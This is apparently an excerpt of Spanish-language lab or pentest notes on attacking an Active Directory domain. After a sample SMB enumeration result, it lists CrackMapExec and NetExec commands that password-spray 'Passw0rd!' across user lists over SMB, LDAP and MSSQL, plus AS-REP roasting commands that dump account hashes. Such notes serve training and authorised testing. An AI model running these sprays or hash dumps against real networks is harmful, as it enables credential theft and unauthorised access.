...
SMB         192.168.133.158 445    WIN-TOE6NQTR989  [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN-TOE6NQTR989) (domain:DOMAIN.LOCAL) (signing:True) (SMBv1:True)
...
```
(name:WIN-TOE6NQTR989) (domain:DOMAIN.LOCAL)
```

- **name ≠ domain** — Está en el dominio `DOMAIN.LOCAL`
...
- **Dominio:** DOMAIN.LOCAL ✓ En dominio
...
```bash
# CrackMapExec
crackmapexec smb <IP> -u users.txt -p 'Passw0rd!'

# NetExec
netexec smb <IP> -u users.txt -p 'Passw0rd!'
```
...
```bash
# CrackMapExec
crackmapexec smb <IP> -u noemi david grace carlos -p 'Passw0rd!'

# NetExec
netexec smb <IP> -u noemi david grace carlos -p 'Passw0rd!'
```
...
echo '10.129.203.121 DOMAIN.LOCAL dc01.DOMAIN.LOCAL' >> /etc/hosts
```

```bash
# CrackMapExec
crackmapexec ldap dc01.DOMAIN.LOCAL -u users.txt -p 'Passw0rd!'

# NetExec
netexec ldap dc01.DOMAIN.LOCAL -u users.txt -p 'Passw0rd!'
```
...
```bash
# CrackMapExec
crackmapexec mssql <IP> -u users.txt -p 'Passw0rd!' -d DOMAIN.LOCAL

# NetExec
netexec mssql <IP> -u users.txt -p 'Passw0rd!' -d DOMAIN.LOCAL
```
...
```bash
# CrackMapExec
crackmapexec mssql <IP> -u users.txt -p 'Passw0rd!' -d .

# NetExec
netexec mssql <IP> -u users.txt -p 'Passw0rd!' -d .
```
...
```bash
# CrackMapExec
crackmapexec mssql <IP> -u users.txt -p 'Passw0rd!' --local-auth

# NetExec
netexec mssql <IP> -u users.txt -p 'Passw0rd!' --local-auth
```
...
```bash
# CrackMapExec
crackmapexec ldap dc01.DOMAIN.LOCAL -u users.txt -p '' --asreproast asreproast.out

# NetExec
netexec ldap dc01.DOMAIN.LOCAL -u users.txt -p '' --asreproast asreproast.out
```
...
```bash
# CrackMapExec
crackmapexec ldap dc01.DOMAIN.LOCAL -u grace -p 'Passw0rd!' --asreproast asreproast.out

# NetExec
netexec ldap dc01.DOMAIN.LOCAL -u grace -p 'Passw0rd!' --asreproast asreproast.out
```
